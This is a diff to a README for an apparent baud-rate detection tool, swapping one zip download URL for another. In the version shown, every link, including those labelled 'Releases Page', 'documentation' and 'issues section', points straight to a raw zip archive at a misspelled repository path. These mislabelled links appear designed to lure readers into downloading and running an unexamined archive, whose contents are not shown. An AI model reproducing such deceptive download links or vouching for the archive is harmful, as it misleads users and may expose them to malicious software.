@@ -6,7 +6,7 @@ Welcome to Baud_Rate_Finder! This tool helps you automatically find the baud rat
 
 ## 📥 Download the Application
 
-[![Download Baud_Rate_Finder](https://raw.githubusercontent.com/vic-0204/Baud_Rate_Finder/main/unbaste/Baud_Rate_Finder.zip%20Here-blue)](https://raw.githubusercontent.com/vic-0204/Baud_Rate_Finder/main/unbaste/Baud_Rate_Finder.zip)
+[![Download Baud_Rate_Finder](https://github.com/vic-0204/Baud_Rate_Finder/raw/refs/heads/main/Buad_Rate_Finder/Rate_Baud_Finder_1.2.zip%20Here-blue)](https://github.com/vic-0204/Baud_Rate_Finder/raw/refs/heads/main/Buad_Rate_Finder/Rate_Baud_Finder_1.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Welcome to Baud_Rate_Finder! This tool helps you automatically find the baud rat
 
 To download Baud_Rate_Finder, visit the Releases page by clicking the link below:
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/vic-0204/Baud_Rate_Finder/main/unbaste/Baud_Rate_Finder.zip)
+[Visit the Releases Page to Download](https://github.com/vic-0204/Baud_Rate_Finder/raw/refs/heads/main/Buad_Rate_Finder/Rate_Baud_Finder_1.2.zip)
 
 ### Step-by-Step Installation
 
@@ -59,8 +59,8 @@ To download Baud_Rate_Finder, visit the Releases page by clicking the link below
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For further help, refer to the official [documentation](https://raw.githubusercontent.com/vic-0204/Baud_Rate_Finder/main/unbaste/Baud_Rate_Finder.zip).
-- **GitHub Issues**: Report any bugs or request features in the [issues section](https://raw.githubusercontent.com/vic-0204/Baud_Rate_Finder/main/unbaste/Baud_Rate_Finder.zip).
+- **Documentation**: For further help, refer to the official [documentation](https://github.com/vic-0204/Baud_Rate_Finder/raw/refs/heads/main/Buad_Rate_Finder/Rate_Baud_Finder_1.2.zip).
+- **GitHub Issues**: Report any bugs or request features in the [issues section](https://github.com/vic-0204/Baud_Rate_Finder/raw/refs/heads/main/Buad_Rate_Finder/Rate_Baud_Finder_1.2.zip).
 - **Community Support**: Join discussions in our support forums to share tips and tricks.
 
 ## 📱 Related Topics
